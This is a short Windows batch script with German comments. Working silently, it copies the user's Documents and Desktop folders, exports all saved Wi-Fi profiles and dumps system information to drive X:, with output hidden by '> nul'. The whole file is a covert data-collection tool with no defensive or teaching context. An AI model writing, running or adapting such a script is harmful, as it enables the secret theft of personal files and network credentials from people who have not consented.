@echo off

:: Kopiere alle Dateien im Dokumente- und Desktop-Ordner des Benutzers
xcopy /e/i "%USERPROFILE%\Documents" "X:\" > nul
xcopy /e/i "%USERPROFILE%\Desktop" "X:\" > nul

:: Kopiere alle WLAN-Profile
netsh wlan export profile folder="X:\" > nul

:: Kopiere alle Systeminformationen
systeminfo > X:\Systeminfo.txt > nul